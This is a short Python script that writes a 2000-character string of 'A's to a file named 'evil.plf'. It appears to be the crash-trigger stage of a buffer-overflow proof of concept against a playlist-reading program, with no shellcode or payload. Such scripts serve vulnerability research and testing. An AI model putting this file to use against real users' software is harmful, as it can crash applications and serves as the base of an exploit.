#!/usr/bin/python -w

filename="evil.plf"

buffer = "A"*2000

textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()
